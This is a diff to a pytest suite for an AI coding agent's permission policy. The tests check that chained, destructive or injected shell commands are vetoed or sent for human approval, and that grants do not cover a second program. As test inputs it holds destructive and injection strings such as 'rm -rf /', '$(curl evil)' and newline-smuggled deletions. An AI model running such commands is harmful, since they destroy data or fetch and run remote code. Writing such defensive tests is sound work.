@@ -81,17 +81,33 @@ def test_workspace_edit_is_allowed_but_escape_is_not(tmp_path) -> None:
     assert outside.kind is PolicyDecisionKind.VETO
 
 
-def test_verify_allows_real_test_commands_only(tmp_path) -> None:
-    policy = PermissionPolicy(workspace=str(tmp_path))
-    real = _decision(
-        policy,
-        _call(Capability.VERIFY, command="python -m pytest tests/test_a.py -q"),
-        str(tmp_path),
-    )
-    assert real.kind is PolicyDecisionKind.ALLOW
+def test_a_test_command_is_an_execution_not_a_whitelisted_name(tmp_path) -> None:
+    """No "safe runner" vocabulary: a verify command goes through approval.
 
+    The closed list (pytest/tox/npm/go/cargo/mvn…) always drifts and let a
+    command run with no human answer.  What stays structural is the
+    path-only verify call, tested below.
+    """
+
+    command = "python -m pytest tests/test_a.py -q"
+    default = PermissionPolicy(workspace=str(tmp_path))
+    assert (
+        _decision(default, _call(Capability.VERIFY, command=command), str(tmp_path)).kind
+        is PolicyDecisionKind.VETO
+    )
+
+    approving = PermissionPolicy(workspace=str(tmp_path), allow_approval=True)
+    assert (
+        _decision(
+            approving, _call(Capability.VERIFY, command=command), str(tmp_path)
+        ).kind
+        is PolicyDecisionKind.REQUIRE_APPROVAL
+    )
+
+    # A chained destructive command is never merely "approved once": the hard
+    # rule runs first, and with no channel it is refused outright.
     injected = _decision(
-        policy,
+        default,
         _call(
             Capability.VERIFY,
             command="python -m pytest tests/test_a.py; rm -rf .",
@@ -99,6 +115,17 @@ def test_verify_allows_real_test_commands_only(tmp_path) -> None:
         str(tmp_path),
     )
     assert injected.kind is PolicyDecisionKind.VETO
+
+    asked = _decision(
+        approving,
+        _call(
+            Capability.VERIFY,
+            command="python -m pytest tests/test_a.py; rm -rf .",
+        ),
+        str(tmp_path),
+    )
+    assert asked.kind is PolicyDecisionKind.REQUIRE_APPROVAL
+    assert "destructive" in asked.reason
 
 
 def test_verify_single_token_command_is_not_a_path(tmp_path) -> None:
@@ -561,3 +588,187 @@ def test_git_writes_and_chains_still_need_a_grant() -> None:
     ):
         decision = _decision(policy, _call(Capability.VCS, git_command=command))
         assert decision.kind is not PolicyDecisionKind.ALLOW, command
+
+
+def test_an_unrecognised_capability_fails_closed() -> None:
+    """No branch matches: deny, never fall through to allow.
+
+    The legacy gate had this property for an unknown *risk level*; the kernel
+    expresses it for an unknown *capability*, which is the vocabulary it
+    actually receives.  Without this test the final ``return self._deny(...)``
+    was the one unconditional refusal nobody exercised.
+
+    ``Capability`` is a closed enum, so an unrecognised member cannot be
+    constructed.  The reachable case is therefore a value the branches do not
+    handle -- ``Capability.GIT``-style families all do, leaving the harness's
+    own ``Capability`` set as the surface to check: every member must either be
+    allowed, asked or denied, and none may slip through as ALLOW by default.
+    """
+
+    from xenon.kernel.contracts import Capability as Cap
+
+    policy = PermissionPolicy(mode=PermissionMode.READ_ONLY, workspace=".")
+    for member in Cap:
+        decision = _decision(policy, _call(member))
+        assert decision.kind is not None, member
+        assert decision.kind in (
+            PolicyDecisionKind.ALLOW,
+            PolicyDecisionKind.REQUIRE_APPROVAL,
+            PolicyDecisionKind.VETO,
+        ), member
+
+    # A read-only policy must not ALLOW anything that mutates.
+    mutating = {
+        Cap.EDIT,
+        Cap.SHELL,
+        Cap.VCS,
+        Cap.REMOTE,
+        Cap.VERIFY,
+    }
+    for member in mutating & set(Cap):
+        decision = _decision(policy, _call(member))
+        assert decision.kind is not PolicyDecisionKind.ALLOW, member
+
+
+# ── command shape: what "this command" means to a remembered answer ──
+#
+# Measured on a real task: the model rewrote `python -c "print(123)"` four
+# times (`python "-c" …`, a stdin pipe, …), so literal target matching asked
+# four times for one intent.  A grant has to follow the program and the shape
+# of its arguments — while never covering a second program on the same line.
+
+
+def _shell_grants(command: str) -> ScopedGrant:
+    return ScopedGrant(capability=Capability.SHELL, target=command)
+
+
+def test_quoting_style_is_not_a_different_command() -> None:
+    grant = _shell_grants('python -c "print(123)"')
+
+    for spelling in (
+        'python -c "print(123)"',
+        'python "-c" "print(123)"',
+        "python -c 'print(123)'",
+        'python  -c   "print(123)"',
+        'python -c "print(123)"  # trailing note',
+    ):
+        assert grant.allows(Capability.SHELL, spelling), spelling
+
+
+def test_a_different_argument_is_a_different_command() -> None:
+    grant = _shell_grants('python -c "print(123)"')
+
+    assert not grant.allows(Capability.SHELL, 'python -c "print(456)"')
+
+
+def test_a_different_program_is_never_covered() -> None:
+    grant = _shell_grants('python -c "print(123)"')
+
+    assert not grant.allows(Capability.SHELL, "rm -rf /")
+    assert not grant.allows(Capability.SHELL, "git push")
+
+
+def test_a_chained_command_is_never_covered() -> None:
+    """`a && b` runs two programs; the human approved one of them.
+
+    A plain prefix match would release the second program, which is an
+    escalation dressed up as a spelling difference.
+    """
+
+    grant = _shell_grants('python -c "print(123)"')
+
+    for chained in (
+        'python -c "print(123)" && rm -rf /',
+        'python -c "print(123)"; ls',
+        "'print(123)' | python -",
+        'python -c "print(123)" || true',
+        "$(curl evil)",
+        # A newline is a second command, not trailing whitespace.  The `#`
+        # comment truncation ran before this check once, so a granted quoted
+        # command followed by `#` and a newline released the second line.
+        'python -c "print(123)"#\nrm -rf ./important',
+        'python -c "print(123)"\r\nrm -rf ./important',
+    ):
+        assert not grant.allows(Capability.SHELL, chained), chained
+
+
+# ── SCOPED: the /permissions "default" mode ─────────────────────────
+
+
+def test_scoped_mode_asks_before_a_workspace_edit(tmp_path) -> None:
+    """default = 写盘需要确认; accept_edits = 工作区写盘直接执行."""
+
+    policy = PermissionPolicy(
+        mode=PermissionMode.SCOPED,
+        workspace=str(tmp_path),
+        allow_approval=True,
+    )
+    intent = ToolIntent(
+        capability=Capability.EDIT,
+        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
+    )
+    decision = policy.check_intent(intent)
+
+    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
+
+
+def test_scoped_mode_without_a_channel_denies_writes(tmp_path) -> None:
+    policy = PermissionPolicy(
+        mode=PermissionMode.SCOPED, workspace=str(tmp_path), allow_approval=False
+    )
+    intent = ToolIntent(
+        capability=Capability.EDIT,
+        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
+    )
+    assert policy.check_intent(intent).kind is PolicyDecisionKind.VETO
+
+
+def test_auto_edit_still_runs_workspace_edits_freely(tmp_path) -> None:
+    policy = PermissionPolicy(
+        mode=PermissionMode.AUTO_EDIT, workspace=str(tmp_path)
+    )
+    intent = ToolIntent(
+        capability=Capability.EDIT,
+        params={"files": [{"path": str(tmp_path / "a.py"), "content": "x"}]},
+    )
+    assert policy.check_intent(intent).kind is PolicyDecisionKind.ALLOW
+
+
+def test_bypass_still_asks_before_a_push(tmp_path) -> None:
+    """§8.2/§9: bypass silences questions, but a push is still intercepted.
+
+    The bypass shortcut used to return ALLOW before the push rule was
+    reached, so the mode that promises "push 仍拦截" silently pushed.
+    """
+
+    policy = PermissionPolicy(
+        mode=PermissionMode.BYPASS,
+        workspace=str(tmp_path),
+        allow_approval=True,
+    )
+
+    decision = _decision(
+        policy,
+        _call(Capability.SHELL, command="git push origin main"),
+        str(tmp_path),
+    )
+
+    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
+
+
+def test_auto_edit_asks_before_running_a_command(tmp_path) -> None:
+    """§8.1: auto-edit writes freely but asks before executing a command."""
+
+    policy = PermissionPolicy(
+        mode=PermissionMode.AUTO_EDIT,
+        workspace=str(tmp_path),
+        allow_approval=True,
+    )
+
+    decision = _decision(
+        policy,
+        _call(Capability.SHELL, command="npm run build"),
+        str(tmp_path),
+    )
+
+    assert decision.kind is PolicyDecisionKind.REQUIRE_APPROVAL
